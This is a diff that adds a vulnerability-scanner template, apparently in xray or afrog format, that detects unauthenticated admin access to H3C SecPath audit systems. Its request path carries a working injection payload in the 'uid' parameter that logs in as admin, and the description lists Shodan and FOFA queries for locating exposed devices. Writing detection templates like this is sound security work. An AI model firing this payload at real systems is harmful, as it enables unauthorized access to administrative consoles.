@@ -1,0 +1,24 @@
+id: h3csecparh-unauthorized-login
+
+info:
+  name: H3C Server - Unauthenticated Access
+  author: Print1n(http://print1n.top)
+  severity: high
+  description: |-
+    H3C server was able to be accessed with no authentication requirements in place.
+    shodan: http.html:"H3C-SecPath-运维审计系统"
+    fofa: app="H3C-SecPath-运维审计系统" && body="2018"
+  tags: h3c,default-login,unauth
+  created: 2023/06/17
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'错误的id') &&
+      response.body.bcontains(b'审计管理员') &&
+      response.body.bcontains(b'admin')
+expression: r0()
